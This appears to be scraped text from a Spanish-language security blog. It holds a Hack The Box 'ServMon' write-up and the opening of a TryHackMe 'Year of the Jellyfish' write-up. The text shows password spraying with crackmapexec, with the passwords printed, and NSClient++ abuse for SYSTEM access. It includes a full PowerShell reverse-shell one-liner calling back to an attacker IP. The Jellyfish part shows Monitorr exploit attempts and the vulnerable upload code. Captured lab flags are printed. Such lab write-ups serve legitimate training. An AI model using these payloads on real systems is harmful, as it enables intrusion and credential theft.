SF:TD/xhtml1-transitional\\.dtd\\\u0026#34;\u0026gt;\\r\\n\\r\\n\u0026lt;html\\x20xmlns=\\\u0026#34;http://www\\.w3\\. SF:org/1999/xhtml\\\u0026#34;\u0026gt;\\r\\n\u0026lt;head\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\\r\\n\\x20\\ SF:x20\\x20\\x20\u0026lt;script\\x20type=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20window\\.location\\.href\\x20=\\x20\\\u0026#34;Pages/login\\.htm\\\u0026#34;;\\r\\n\\x2 SF:0\\x20\\x20\\x20\u0026lt;/script\u0026gt;\\r\\n\u0026lt;/head\u0026gt;\\r\\n\u0026lt;body\u0026gt;\\r\\n\u0026lt;/body\u0026gt;\\r\\n\u0026lt;/html\u0026gt;\\r\\n\u0026#34;) SF:%r(HTTPOptions,1B4,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20text/htm SF:l\\r\\nContent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\ SF:n\\r\\n\\xef\\xbb\\xbf\u0026lt;!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20XHTML\\ SF:x201\\.0\\x20Transitional//EN\\\u0026#34;\\x20\\\u0026#34;http://www\\.w3\\.org/TR/xhtml1/DTD/xh SF:tml1-transitional\\.dtd\\\u0026#34;\u0026gt;\\r\\n\\r\\n\u0026lt;html\\x20xmlns=\\\u0026#34;http://www\\.w3\\.org/1 SF:999/xhtml\\\u0026#34;\u0026gt;\\r\\n\u0026lt;head\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\\r\\n\\x20\\x20\\x SF:20\\x20\u0026lt;script\\x20type=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20window\\.location\\.href\\x20=\\x20\\\u0026#34;Pages/login\\.htm\\\u0026#34;;\\r\\n\\x20\\x20 SF:\\x20\\x20\u0026lt;/script\u0026gt;\\r\\n\u0026lt;/head\u0026gt;\\r\\n\u0026lt;body\u0026gt;\\r\\n\u0026lt;/body\u0026gt;\\r\\n\u0026lt;/html\u0026gt;\\r\\n\u0026#34;)%r(RT SF:SPRequest,1B4,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20text/html\\r\\n SF:Content-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n\\r\\n SF:\\xef\\xbb\\xbf\u0026lt;!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20XHTML\\x201\\ SF:.0\\x20Transitional//EN\\\u0026#34;\\x20\\\u0026#34;http://www\\.w3\\.org/TR/xhtml1/DTD/xhtml1- SF:transitional\\.dtd\\\u0026#34;\u0026gt;\\r\\n\\r\\n\u0026lt;html\\x20xmlns=\\\u0026#34;http://www\\.w3\\.org/1999/x SF:html\\\u0026#34;\u0026gt;\\r\\n\u0026lt;head\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\\r\\n\\x20\\x20\\x20\\x2 SF:0\u0026lt;script\\x20type=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20window\\.location\\.href\\x20=\\x20\\\u0026#34;Pages/login\\.htm\\\u0026#34;;\\r\\n\\x20\\x20\\x20\\ SF:x20\u0026lt;/script\u0026gt;\\r\\n\u0026lt;/head\u0026gt;\\r\\n\u0026lt;body\u0026gt;\\r\\n\u0026lt;/body\u0026gt;\\r\\n\u0026lt;/html\u0026gt;\\r\\n\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 4m17s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-05-13T00:00:59 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed May 12 19:57:10 2021 -- 1 IP address (1 host up) scanned in 195.09 seconds FTP En el servicio FTP encontramos dos archivos en las carpetas de los usuarios Nadine y Nathan.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ftp\u0026gt; dir 200 PORT command successful. 125 Data connection already open; Transfer starting. 01-18-20 12:06PM \u0026lt;DIR\u0026gt; Nadine 01-18-20 12:08PM \u0026lt;DIR\u0026gt; Nathan 226 Transfer complete. ftp\u0026gt; dir Nadine 200 PORT command successful. 125 Data connection already open; Transfer starting. 01-18-20 12:08PM 174 Confidential.txt 226 Transfer complete. ftp\u0026gt; dir Nathan 200 PORT command successful. 125 Data connection already open; Transfer starting. 01-18-20 12:10PM 186 Notes to do.txt 226 Transfer complete. ftp\u0026gt; El primer archivo indica que la contraseña de Nathan esta en el escritorio y en el archivo Passwords.txt. En el segundo archivo se listan cosas por hacer.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 π ~/htb/servmon ❯ cat Confidential.txt Nathan, I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder. Regards Nadine π ~/htb/servmon ❯ cat Notes\\ to\\ do.txt 1) Change the password for NVMS - Complete 2) Lock down the NSClient Access - Complete 3) Upload the passwords 4) Remove public access to NVMS 5) Place the secret files in SharePoint SMB Intentamos listar los recursos compartidos con una sesion nula pero no tenemos acceso.\n1 2 3 π ~/htb/servmon ❯ cme smb 10.10.10.184 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.184 445 SERVMON [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False) SMB 10.10.10.184 445 SERVMON [-] ServMon\\: STATUS_ACCESS_DENIED NADINE - USER HTTP Encontramos un login de NVMS 1000.\nNVMS 1000 - Directory Traversal Realizamos una busqueda de vulnerabilidades en NVMS y vemos un exploit que indica una vulnerabilidad Directory Traversal, tambien vemos el exploit que realiza la \u0026ldquo;explotacion\u0026rdquo;.\nEn una de las notas indica que existe un archivo en el escritorio de uno de los usuarios, realizamos una solicitud a ese archivo y encontramos varias contraseñas.\nUtilizamos crackmapexec con una pequeña lista de usuarios y contraseñas al servicio smb, logramos encontrar las correctas aunque no vemos ningun recurso en samba, por lo que verificamos en SSH y logramos ver que la contraseña es aceptada con el usuario nadine.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 π ~/htb/servmon ❯ cme smb 10.10.10.184 -u users.txt -p passwords.txt SMB 10.10.10.184 445 SERVMON [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False) SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [-] ServMon\\nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE SMB 10.10.10.184 445 SERVMON [+] ServMon\\nadine:L1k3B1gBut7s@W0rk π ~/htb/servmon ❯ cme smb 10.10.10.184 -u \u0026#39;nadine\u0026#39; -p \u0026#39;L1k3B1gBut7s@W0rk\u0026#39; --shares SMB 10.10.10.184 445 SERVMON [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False) SMB 10.10.10.184 445 SERVMON [+] ServMon\\nadine:L1k3B1gBut7s@W0rk SMB 10.10.10.184 445 SERVMON [+] Enumerated shares SMB 10.10.10.184 445 SERVMON Share Permissions Remark SMB 10.10.10.184 445 SERVMON ----- ----------- ------ SMB 10.10.10.184 445 SERVMON ADMIN$ Remote Admin SMB 10.10.10.184 445 SERVMON C$ Default share SMB 10.10.10.184 445 SERVMON IPC$ READ Remote IPC π ~/htb/servmon ❯ cme ssh 10.10.10.184 -u \u0026#39;nadine\u0026#39; -p \u0026#39;L1k3B1gBut7s@W0rk\u0026#39; SSH 10.10.10.184 22 10.10.10.184 [*] SSH-2.0-OpenSSH_for_Windows_7.7 SSH 10.10.10.184 22 10.10.10.184 [+] nadine:L1k3B1gBut7s@W0rk Ingresamos por medio de SSH, logramos obtener la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 Microsoft Windows [Version 10.0.18363.752] (c) 2019 Microsoft Corporation. All rights reserved. nadine@SERVMON C:\\Users\\Nadine\u0026gt;whoami servmon\\nadine nadine@SERVMON C:\\Users\\Nadine\u0026gt;type Desktop\\user.txt 924e7dffa2f7c2e53e3c9c1bc6211065 nadine@SERVMON C:\\Users\\Nadine\u0026gt; PRIVILEGE ESCALATION Realizamos una enumeracion de archivos, y encontramos que existe NSClient++, tras realizar una busqueda de exploits encontramos que es posible escalar privilegios utilizando un archivo .bat, además un exploit - Authenticated Remote Code Execution para ejecutar comandos remotamente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PS C:\\Program Files\u0026gt; dir Directory: C:\\Program Files Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 08/04/2020 23:21 Common Files d----- 08/04/2020 23:18 Internet Explorer d----- 19/03/2019 04:52 ModifiableWindowsApps d----- 16/01/2020 18:11 NSClient++ d----- 08/04/2020 23:09 Reference Assemblies [... REDACTED ...] Verificamos que NSCP estuviera corriendo, además verificamos en que puerto esta disponible. Tambien verificamos el archivo de configuracion donde encontramos la contraseña y vemos que solo estan \u0026ldquo;permitidas conexiones\u0026rdquo; desde 127.0.0.1.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 PS C:\\Users\\Nadine\u0026gt; Get-Service -Name nscp | Select-Object * Name : nscp RequiredServices : CanPauseAndContinue : False CanShutdown : False CanStop : True DisplayName : NSClient++ Monitoring Agent DependentServices : MachineName : . ServiceName : nscp ServicesDependedOn : ServiceHandle : Status : Running ServiceType : Win32OwnProcess StartType : Site : Container : PS C:\\Program Files\u0026gt; ps |findstr \u0026#34;nscp\u0026#34; 442 31 18976 30632 2660 0 nscp PS C:\\Program Files\u0026gt; netstat -ano | findstr \u0026#34;2660\u0026#34; TCP 0.0.0.0:5666 0.0.0.0:0 LISTENING 2660 TCP 0.0.0.0:5666 0.0.0.0:0 LISTENING 2660 TCP 0.0.0.0:8443 0.0.0.0:0 LISTENING 2660 TCP [::]:5666 [::]:0 LISTENING 2660 UDP 0.0.0.0:51512 *:* 2660 UDP 127.0.0.1:51511 *:* 2660 PS C:\\Program Files\u0026gt; cd NSCLIENT++ PS C:\\Program Files\\NSCLIENT++\u0026gt; cat .\\nsclient.ini # If you want to fill this file with all available options run the following command: # nscp settings --generate --add-defaults --load-all # If you want to activate a module and bring in all its options use: # nscp settings --activate-module \u0026lt;MODULE NAME\u0026gt; --add-defaults # For details run: nscp settings --help ; in flight - TODO [/settings/default] ; Undocumented key password = ew2x6SsGTxjRwXOT ; Undocumented key allowed hosts = 127.0.0.1 Para realizar la explotacion primero obtuvimos el puerto 8443 localmente utilizando ssh.\n1 ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 Tras obtener el puerto localmente, obtuvimos la contraseña, utilizando nscp.exe.\n1 2 3 PS C:\\program files\\nsclient++\u0026gt; .\\nscp.exe web -- password --display Current password: ew2x6SsGTxjRwXOT PS C:\\program files\\nsclient++\u0026gt; Tras analizar el exploit creamos dos archivos, nc64.exe, para ejecutar una shell inversa que a continuacion se explica de dos \u0026ldquo;formas\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 PS C:\\Temp\u0026gt; dir Directory: C:\\Temp Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 14/05/2021 01:39 680 exec.bat -a---- 14/05/2021 01:50 45272 nc64.exe PS C:\\Temp\u0026gt; CheckExternalScripts [1] Para la explotacion creamos un nuevo script en Settings.\nLe agregamos un alias, el script o comando a ejecutar y guardamos.\nGuardamos los cambios en la opcion Changes.\nNos dirigimos a Modules, activamos y desactivamos el modulo en el check, esto guardará y activará los scripts creados.\nLuego nos dirigimos a Modulos \u0026gt; CheckExternalScripts \u0026gt; Queries donde observamos los scripts previamente creados.\nEl script que ejecuta el archivo C:\\Temp\\exec.bat que contiene una shell inversa para powershell no funcionó con esta \u0026ldquo;forma\u0026rdquo;.\nNos dirigimos al querie script_shell y Run, donde ejecutamos nuestro script.\nLuego de esto nuestra shell inversa será ejecutada, con lo cual obtenemos una shell nt authority\\system y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/servmon ❯ sudo nc -lvp 80 listening on [any] 80 ... connect to [10.10.14.3] from 10.10.10.184 [10.10.10.184] 52222 Microsoft Windows [Version 10.0.18363.752] (c) 2019 Microsoft Corporation. All rights reserved. C:\\Program Files\\NSClient++\u0026gt;whoami whoami nt authority\\system C:\\Program Files\\NSClient++\u0026gt;type \u0026#34;C:\\Users\\Administrator\\Desktop\\root.txt\u0026#34; type \u0026#34;C:\\Users\\Administrator\\Desktop\\root.txt\u0026#34; 0f4b1f505e07879477a1ebdd7bccb170 CheckExternalScripts [2] Creamos una shell inversa con powershell y colocamos el puerto 80 a la escucha con netcat.\n1 2 powershell -nop -W hidden -noni -ep bypass -c \u0026#34;$TCPClient = New-Object Net.Sockets.TCPClient(\u0026#39;10.10.14.17\u0026#39;, 80);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \u0026#39;SHELL\u0026gt; \u0026#39;);$StreamWriter.Flush()}WriteToStream \u0026#39;\u0026#39;;while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2\u0026gt;\u0026amp;1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\u0026#34; # π ~/htb/servmon ❯ sudo nc -lvp 80 Para obtener una shell utilizamos unicamente el modulo CheckExternalScripts el cual contiene la opcion en configuracion del modulo para ejecutar comando. Nos dirigimos a modulos donde encontramos CheckExternalScripts y en configuraciones de /settings/external scripts/scripts/default agregamos en command nuestra shell inversa. Regresamos nuevamente al modulo CheckExternalScripts, desactivamos y activamos.\nLo cual ejecutará el comando previiamente creado (shell inversa) y con el logramos obtener una shell nt authority\\system y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 π ~/htb/servmon ❯ sudo nc -lvp 80 listening on [any] 80 ... connect to [10.10.14.17] from 10.10.10.184 [10.10.10.184] 56431 SHELL\u0026gt; whoami nt authority\\system SHELL\u0026gt; cd C:\\Users\\Administrator\\Desktop SHELL\u0026gt; dir Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 13/05/2021 06:55 34 root.txt SHELL\u0026gt; type root.txt 034e2552b8082e806157bff19bab470c NSClient++ Windows Conf ","description":"ServMon una maquina de HackTheBox, encontramos una vulnerabilidad en NVMS lo que nos permitio obtener un wordlist que utilizamos con CrackMapExec para realizar Password spraying y obtener acceso por SSH. Finalmente encontramos NSClient lo que nos llevo a realizar un Tunnel con SSH para obtener el puerto localmente y explotar una vulnerabilidad que nos dio acceso privilegiado.","id":66,"section":"posts","tags":["ftp","smb","crackmapexec","nsclient++","powershell"],"title":"Hack The Box - ServMon","uri":"https://sckull.github.io/posts/servmon/"},{"content":"\rYear of the Jellyfish es una maquina de TryHackMe, descubrimos dominios y subdominios con SSLSCAN lo que nos permitio encontrar una vulnerabilidad en Monitorr, se muestran dos formas para realizar bypass al filtro de ficheros lo que permitio obtener acceso. Finalmente ejecutamos Linpeas lo que nos guió una vulnerabilidad en snapd la cual explotamos para obtener acceso privilegiado.\nRoom Titulo Year of the Jellyfish Descripción Some boxes sting\u0026hellip; Puntos 110 Dificultad Dificil Maker MuirlandOracle NMAP Escaneo de puertos con nmap muestra el puerto ftp (21), ssh (22, 22222), http (80, 8000) y el puerto https (443) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 # Nmap 7.91 scan initiated Tue Apr 27 02:29:03 2021 as: nmap -sC -sV -p21,22,80,443,8000,22222 -oN allports 54.171.187.11 Nmap scan report for jelly.thm (54.171.187.11) Host is up (0.44s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |_ 2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA) 80/tcp open http Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Did not follow redirect to https://robyns-petshop.thm/ 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Robyn\u0026amp;#039;s Pet Shop | ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB | Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm | Not valid before: 2021-04-27T06:04:33 |_Not valid after: 2022-04-27T06:04:33 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 8000/tcp open http-alt | fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request | Content-Length: 15 |_ Request 22222/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8d:99:92:52:8e:73:ed:91:01:d3:a7:a0:87:37:f0:4f (RSA) | 256 5a:c0:cc:a1:a8:79:eb:fd:6f:cf:f8:78:0d:2f:5d:db (ECDSA) |_ 256 0a:ca:b8:39:4e:ca:e3:cf:86:5c:88:b9:2e:25:7a:1b (ED25519) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.91%I=7%D=4/27%Time=6087AF3C%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,3F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Length:\\x2 SF:015\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;); Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Apr 27 02:29:44 2021 -- 1 IP address (1 host up) scanned in 40.32 seconds HTTP Encontramos una pagina en el puerto 80 la cual redirige hacia un dominio.\n1 2 3 4 5 HTTP/1.1 302 Found Date: Tue, 27 Apr 2021 06:23:18 GMT Server: Apache/2.4.29 (Ubuntu) Location: https://robyns-petshop.thm/ Content-Type: text/html; charset=iso-8859-1 SSLSCAN Nmap muestra un dominio y subdominios, utilizamos sslscan para verificar estos subdominios.\n1 2 3 4 5 6 7 8 9 10 11 12 ╭─kali@kali ~/thm/jellyfish/tmp ╰─➤ sslscan 54.171.187.11|tail -n 10 SSL Certificate: Signature Algorithm: sha256WithRSAEncryption RSA Key Strength: 2048 Subject: robyns-petshop.thm Altnames: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm Issuer: robyns-petshop.thm Not valid before: Apr 27 06:04:33 2021 GMT Not valid after: Apr 27 06:04:33 2022 GMT GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en cada uno de los subdominios y dominio principal, tambien el puerto 8000.\n1 2 3 4 5 6 7 8 9 10 11 12 # gohttp https://robyns-petshop.thm -k /assets (Status: 301) [Size: 327] [--\u0026gt; https://robyns-petshop.thm/assets/] /business (Status: 401) [Size: 466] /config (Status: 301) [Size: 327] [--\u0026gt; https://robyns-petshop.thm/config/] /content (Status: 301) [Size: 328] [--\u0026gt; https://robyns-petshop.thm/content/] /index.php (Status: 200) [Size: 3671] /index.php (Status: 200) [Size: 3671] /LICENSE (Status: 200) [Size: 1085] /plugins (Status: 301) [Size: 328] [--\u0026gt; https://robyns-petshop.thm/plugins/] /server-status (Status: 403) [Size: 284] /themes (Status: 301) [Size: 327] [--\u0026gt; https://robyns-petshop.thm/themes/] /vendor (Status: 301) [Size: 327] [--\u0026gt; https://robyns-petshop.thm/vendor/] 1 2 3 4 5 6 7 8 9 10 11 12 # gohttp https://monitorr.robyns-petshop.thm -k /assets (Status: 301) [Size: 345] [--\u0026gt; https://monitorr.robyns-petshop.thm/assets/] /changelog.html (Status: 200) [Size: 4655] /data (Status: 301) [Size: 343] [--\u0026gt; https://monitorr.robyns-petshop.thm/data/] /favicon.ico (Status: 200) [Size: 41160] /index.php (Status: 200) [Size: 14974] /index.php (Status: 200) [Size: 14974] /LICENSE.txt (Status: 200) [Size: 1086] /robots.txt (Status: 200) [Size: 87] /robots.txt (Status: 200) [Size: 87] /server-status (Status: 403) [Size: 293] /settings.php (Status: 200) [Size: 16335] 1 2 # curl -s https://beta.robyns-petshop.thm/ -k \u0026lt;html lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Under Development!\u0026lt;/title\u0026gt;\u0026lt;meta charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\u0026lt;meta name=\\\u0026#34;viewport\\\u0026#34; content=\\\u0026#34;width=device-width, initial-scale=1.0\\\u0026#34;\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;Under Construction\u0026lt;/h1\u0026gt;\u0026lt;h2\u0026gt;This site is under development. Please be patient.\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;If you have been given a specific ID to use when accessing this development site, please put it at the end of the url (e.g. beta.robyns-petshop.thm/ID_HERE)\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 # gohttp https://dev.robyns-petshop.thm -k /assets (Status: 301) [Size: 335] [--\u0026gt; https://dev.robyns-petshop.thm/assets/] /business (Status: 401) [Size: 470] /config (Status: 301) [Size: 335] [--\u0026gt; https://dev.robyns-petshop.thm/config/] /content (Status: 301) [Size: 336] [--\u0026gt; https://dev.robyns-petshop.thm/content/] /index.php (Status: 200) [Size: 3703] /index.php (Status: 200) [Size: 3703] /LICENSE (Status: 200) [Size: 1085] /plugins (Status: 301) [Size: 336] [--\u0026gt; https://dev.robyns-petshop.thm/plugins/] /server-status (Status: 403) [Size: 288] /themes (Status: 301) [Size: 335] [--\u0026gt; https://dev.robyns-petshop.thm/themes/] /vendor (Status: 301) [Size: 335] [--\u0026gt; https://dev.robyns-petshop.thm/vendor/] SUBDOMINIOS robyns-petshop.thm: encontramos lo que parece ser CMS pico. monitorr.robyns-petshop.thm: vemos Monitorr en su version 1.7.6m, además en el dashboard vemos PetShop que redirige al puerto 80 en localhost y Jellyfin al puerto 8096. beta.robyns-petshop.thm: al parecer es un sitio en \u0026ldquo;construccion\u0026rdquo;. dev.robyns-petshop.thm: aparentemente es la misma pagina que está en el dominio principal. PUERTO 8096: en este puerto encontramos el login de Jellyfin. SEARCHSPLOIT Realizamos una busqueda de exploits o vulnerabilidades para Pico, Monitorr y Jellyfin. Encontramos una vulnerabilidad de tipo LFI y RFI para Pico aunque ninguna de estas afecta a la version de la maquina. Para Monitorr encontramos dos exploits, uno para realizar bypass al CMS y crear una cuenta de administrador, el segundo para ejecucion de comandos mediante un archivo en PHP.\n1 2 3 4 5 6 ----------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------- --------------------------------- Monitorr 1.7.6m - Authorization Bypass | php/webapps/48981.py Monitorr 1.7.6m - Remote Code Execution (Unauthenticated) | php/webapps/48980.py ----------------------------------------------------------------------------- --------------------------------- MONITORR - RCE Monitorr es de codigo abierto por lo que descargamos la version 1.7.6m para analizar el codigo fuente. El primer exploit Monitorr 1.7.6m - Authorization Bypass crea una cuenta a por medio de _register.php aunque no existe tal archivo y/o direccion. En cuanto al RCE encontramos que la direccion existe.\n1 2 3 ╭─kali@kali ~/thm/jellyfish ╰─➤ curl -s \u0026#34;https://monitorr.robyns-petshop.thm/assets/php/upload.php\u0026#34; -k \u0026lt;div id=\u0026#39;uploadreturn\u0026#39;\u0026gt;You are an exploit.\u0026lt;/div\u0026gt;\u0026lt;div id=\u0026#39;uploaderror\u0026#39;\u0026gt;ERROR: ../data/usrimg/ already exists.\u0026lt;/div\u0026gt;\u0026lt;div id=\u0026#39;uploaderror\u0026#39;\u0026gt;ERROR: was not uploaded.\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt; Al realizar la ejecucion del exploit este nos muestra un error ya que la pagina es HTTPS, aunque al modificar el exploit y ejecutarlo, este no logra subir el archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ╭─kali@kali ~/thm/jellyfish/tmp ╰─➤ python 48980.py https://monitorr.robyns-petshop.thm 10.2.30.132 1338 /usr/share/offsec-awae-wheels/urllib3-1.25.9-py2.py3-none-any.whl/urllib3/connectionpool.py:986: InsecureRequestWarning: Unverified HTTPS request is being made to host \u0026#39;monitorr.robyns-petshop.thm\u0026#39;. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings A shell script should be uploaded. Now we try to execute it /usr/share/offsec-awae-wheels/urllib3-1.25.9-py2.py3-none-any.whl/urllib3/connectionpool.py:986: InsecureRequestWarning: Unverified HTTPS request is being made to host \u0026#39;monitorr.robyns-petshop.thm\u0026#39;. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings ╭─kali@kali ~/thm/jellyfish/tmp ╰─➤ curl -s \u0026#34;https://monitorr.robyns-petshop.thm/assets/data/usrimg/\u0026#34; -k | html2text ****** Index of /assets/data/usrimg ****** [[ICO]] Name Last_modified Size Description =========================================================================== [[PARENTDIR]] Parent_Directory - [[IMG]] usrimg.png 2021-04-11 00:07 5.3K =========================================================================== Apache/2.4.29 (Ubuntu) Server at monitorr.robyns-petshop.thm Port 443 UPLOAD.PHP El archivo upload.php es el que obtiene la imagen y mediante getimagesize() verifica si es una imagen y que tipo, si lo es, sube el archivo, en caso contrario no, por lo que de alguna forma debemos de realizar bypass al \u0026ldquo;filtro\u0026rdquo; realizando cambios a una imagen.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php $target_dir = \u0026#34;../data/usrimg/\u0026#34;; $target_file = $target_dir . basename($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]); $uploadOk = 1; $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION)); $check = getimagesize($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;]); $rawfile = $_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]; echo \u0026#34;\u0026lt;div id=\u0026#39;uploadreturn\u0026#39;\u0026gt;\u0026#34;; if($check !== false) { echo \u0026#34;File \u0026#34; . $rawfile . \u0026#34; is an image: \u0026#34; . $check[\u0026#34;mime\u0026#34;] ; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; $uploadOk = 1; } else { echo \u0026#34;\u0026lt;div id=\u0026#39;uploaderror\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;ERROR: \u0026#34; . $rawfile . \u0026#34; is not an image or exceeds the webserver’s upload size limit.\u0026#34;; echo \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; $uploadOk = 0; } [... REDACTED ...] BYPASS - WEB-SHELL UPLOAD Creamos un archivo html para realizar la subida de archivos hacia upload.php, capturamos la solicitud en burpsuite para modificar los diferentes parametros de solicitud para realizar bypass utilizando Burpsuite.\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form 